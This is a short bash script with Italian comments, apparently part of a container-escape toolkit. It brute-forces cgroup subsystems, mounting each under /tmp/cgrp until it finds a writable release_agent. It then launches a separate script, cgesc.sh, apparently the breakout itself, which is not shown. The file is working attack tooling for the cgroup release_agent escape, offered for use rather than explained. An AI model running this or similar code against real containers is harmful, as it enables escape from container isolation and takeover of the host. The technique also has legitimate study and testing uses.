#!/bin/bash

test_dir=/tmp/cgrp;
mkdir $test_dir;

#bruteforce per indovinare il cgroup radice
while read -r subsys
do
    if bash -c "mount -t cgroup -o $subsys cgroup $test_dir 2>&1 >/dev/null && test -w $test_dir/release_agent && umount $test_dir" >/dev/null 2>&1 ; then
        echo "[!] trovato root cgroup con release_agent in: $subsys"
        ./cgesc.sh $1 $2 $subsys
        exit 0
    fi
done <<< $(cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$')


echo "[x] ricerca del root cgroup con release_agent fallita"
exit 1